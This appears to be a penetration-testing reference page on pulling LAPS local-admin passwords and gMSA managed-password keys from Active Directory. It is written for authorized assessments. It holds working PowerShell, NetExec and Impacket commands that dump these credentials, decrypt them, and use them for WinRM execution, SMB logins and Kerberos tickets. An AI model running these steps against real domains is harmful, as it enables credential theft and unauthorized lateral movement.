# LAPS and group managed service accounts

[← AD quick reference](../05-active-directory.md) · [PowerView LAPS discovery](powerview.md#laps) · [Object rights](object-rights.md) · [Lateral movement](lateral-movement.md)

Start with a controlled domain principal and a specific computer or service account. Record which principal retrieved the material, the object's DN/SID, the managed account name, password/key type, update time, and intended host/service. Read permission, decryption permission, and usable target access are separate findings.

## Choose the material correctly

| Finding | Meaning | Confirm next |
| --- | --- | --- |
| `ms-Mcs-AdmPwd` | Legacy LAPS local-account password | Actual managed username, computer, and currentness |
| `msLAPS-Password` | Windows LAPS JSON containing account/password/update data | Parse the account name and match the host |
| `msLAPS-EncryptedPassword` | Encrypted Windows LAPS password data | Authorized decryptor and successful decryption |
| `msLAPS-EncryptedDSRMPassword` | DC recovery-account material | DSRM context; ordinary domain authentication is a different path |
| `msDS-ManagedPassword` | gMSA managed-password blob | Effective retrieval right and correctly derived account keys |

Windows LAPS stores its AD-backed material on computer objects; storage can also be in Entra ID, which this page does not enumerate. An expiration attribute alone contains no password. [Windows LAPS schema](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference), [LAPS policy and storage](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-management-policy-settings).

## LAPS: retrieve one computer and confirm the account

With the AD module available, inspect a selected object's attributes. Add schema-specific attributes only if that schema is present:

```powershell
$DC = 'dc01.corp.example'
$Cred = Get-Credential -UserName 'CORP\operator' -Message 'AD read credential'
Get-ADComputer -Identity 'FS01' -Server $DC -Credential $Cred -Properties `
    dNSHostName,'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' |
    Select-Object Name,dNSHostName,'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime'

Get-ADComputer -Identity 'FS01' -Server $DC -Credential $Cred -Properties `
    dNSHostName,'msLAPS-Password','msLAPS-PasswordExpirationTime','msLAPS-EncryptedPassword' |
    Select-Object Name,dNSHostName,'msLAPS-Password','msLAPS-PasswordExpirationTime',`
        @{Name='EncryptedValuePresent';Expression={$null -ne $_.'msLAPS-EncryptedPassword'}}
```

PowerView provides the [equivalent scoped discovery](powerview.md#laps) when the AD module is absent. For a schema error, distinguish an unknown attribute from a valid attribute that this principal cannot read.

The Windows LAPS module handles supported cleartext and encrypted formats:

```powershell
Get-Command Get-LapsADPassword
$Laps = Get-LapsADPassword -Identity 'FS01' -DomainController $DC `
    -Credential $Cred -DecryptionCredential $Cred
$Laps | Format-List ComputerName,Account,Source,DecryptionStatus,AuthorizedDecryptor,`
    PasswordUpdateTime,ExpirationTimestamp
```

Successful encrypted retrieval should report successful decryption and return a password object. `Unauthorized` is a decryption failure even if an encrypted value was readable. This example uses the same controlled credential for both operations. If a separately controlled credential has decryption rights, supply it with `-DecryptionCredential`; when omitted, decryption uses the current logged-on user rather than implicitly reusing `-Credential`. Legacy output may not identify the username. [Get-LapsADPassword](https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword).

To inspect an already readable Windows LAPS JSON value:

```powershell
$Computer = Get-ADComputer -Identity 'FS01' -Server $DC -Credential $Cred `
    -Properties 'msLAPS-Password'
if ($Computer.'msLAPS-Password') {
    $Record = $Computer.'msLAPS-Password' | ConvertFrom-Json
    $Record.n
    [DateTime]::FromFileTimeUtc([Convert]::ToInt64($Record.t,16))
    # $Record.p is the password; avoid printing it unless the next step requires it.
}
```

## LAPS proof: use the password on the correct local account

Prerequisites: the result contains the current FS01 local-account password, the managed username is established, and an appropriate service is reachable. For a successful nonlegacy LAPS result returned as SecureString:

```powershell
if (-not $Laps.Account -or -not $Laps.Password) {
    throw 'Confirm a successful password result and the managed account name first.'
}
$LocalCred = [pscredential]::new(('FS01\' + $Laps.Account),$Laps.Password)
Invoke-Command -ComputerName 'fs01.corp.example' -Credential $LocalCred `
    -ScriptBlock { whoami /all; hostname }
```

This proof also requires WinRM endpoint access and compatible authentication policy. A failure here does not by itself invalidate a password. When WinRM is unavailable, confirm the credential on one fitting service:

```bash
nxc smb fs01.corp.example --local-auth -u '<MANAGED-LOCAL-ACCOUNT>' -p '<LAPS-PASSWORD>'
```

Inspect whether authentication succeeded and whether the tool actually confirmed administrative rights. Remote UAC filtering and endpoint policy can constrain local administrators. The recovered local password is tied to FS01; do not interpret it as a domain-admin credential. [Windows remote UAC restrictions](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction), [NetExec SMB authentication](https://www.netexec.wiki/smb-protocol/authentication).

Retrieval does not need an AD mutation, password reset, or expiration-time edit. For cleanup, close proof sessions and remove created output/cache files according to the evidence requirements. LAPS may rotate a password after use according to policy; re-read the relevant object rather than loop over a stale value.

## gMSA: discover the account and retrieval permissions

gMSAs are domain service accounts with managed passwords. The relevant retrieval configuration is `PrincipalsAllowedToRetrieveManagedPassword`, represented in LDAP by `msDS-GroupMSAMembership`. This is a security descriptor; confirm the effective principal/group relationship rather than assuming every displayed SID grants your account access. [Microsoft gMSA management](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/manage-group-managed-service-accounts).

```powershell
Get-ADServiceAccount -Identity 'svc_backup' -Server $DC -Credential $Cred -Properties `
    PrincipalsAllowedToRetrieveManagedPassword,servicePrincipalName,memberOf,`
    'msDS-SupportedEncryptionTypes' |
    Format-List Name,SamAccountName,SID,PrincipalsAllowedToRetrieveManagedPassword,`
        servicePrincipalName,memberOf,'msDS-SupportedEncryptionTypes'
```

Check nested memberships and any confirmed object-control path separately. Adding yourself to a retrieval group or editing the retrieval descriptor changes state and requires [object-rights preservation and restoration](object-rights.md). Merely being able to enumerate the gMSA is insufficient.

From Kali, a controlled credential can retrieve gMSA material where permitted:

```bash
nxc ldap dc01.corp.example --port 636 -d corp.example -u operator -p '<PASSWORD>' --gmsa
```

The reviewed implementation searches gMSAs domain-wide and prints which accounts can be read; this command is not a single-account selector. Use it only where that enumeration scope fits. Its parser accepts `--port 636` for LDAPS; do not invent an `--ldaps` flag. Current source derives NT and AES keys when it obtains the blob; older releases may expose only the NT key. [NetExec gMSA implementation](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/protocols/ldap.py), [LDAP command options](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/protocols/ldap/proto_args.py).

## gMSA proof: authenticate with its key, then inspect its rights

Suppose `svc_backup$` was readable and has access to a known evidence share. Keep the trailing `$` and quote the principal in Bash. Use a returned AES key where supported:

```bash
impacket-getTGT -dc-ip <DC-IP> -aesKey <GMSA-AES256-KEY> 'corp.example/svc_backup$'
(
  export KRB5CCNAME='/absolute/path/to/printed-gmsa-cache.ccache'
  klist -c "$KRB5CCNAME"
  impacket-smbclient -k -no-pass 'corp.example/svc_backup$@fs01.corp.example'
)
```

In the SMB console:

```text
shares
use LabEvidence
ls
exit
```

An NT key can be supplied to `getTGT` with `-hashes :<NT-HASH>` if the domain permits the needed encryption; AES keys and NT keys are not interchangeable. [Impacket getTGT](https://github.com/fortra/impacket/blob/master/examples/getTGT.py).

Check the cache's client principal and the exact directory listing on the known share. Enumerate the gMSA's groups, object rights, SPNs, and delegation settings with the newly controlled identity. A gMSA can authenticate as a domain principal even when interactive logon is unsuitable, but its name does not establish domain-admin or local-admin rights. Do not reset or install a working service account merely to prove possession of its material. Exit the proof client and remove only its newly created cache after required evidence is retained; the subshell leaves the parent shell's previous cache environment intact.

## Failure diagnosis

| Symptom | Check next |
| --- | --- |
| LAPS attribute missing or empty | Correct computer/schema, effective read rights, active storage mode, and whether a value exists |
| Encrypted LAPS value present, no password | Decryption status, authorized decryptor, credential used for decryption, and module availability |
| LAPS username unknown | Legacy managed-account policy, local account inventory, and RID/name mapping; avoid assuming English `Administrator` |
| Password works on SMB, WinRM fails | Endpoint rights, service state, network route, local-token filtering, and logon policy |
| gMSA lists `<no read permissions>` | Effective retrieval descriptor, nested membership, credential context, and protected LDAP transport |
| gMSA key authentication fails | Exact principal/realm, key type, DC encryption configuration, password rotation, DNS, and time |
| Ticket obtained, resource denied | Share/service ACLs and gMSA group/object rights; authentication alone is not authorization |

## Version and validation notes

Microsoft cmdlet signatures and upstream NetExec/Impacket options were reviewed on 2026-10-02. Record local module versions with `Get-Module LAPS,ActiveDirectory -ListAvailable`, and inspect `nxc ldap -h` and `impacket-getTGT -h`. These workflows are source-reviewed; password retrieval, decryption, and remote execution remain pending validation in an isolated Windows/AD lab.
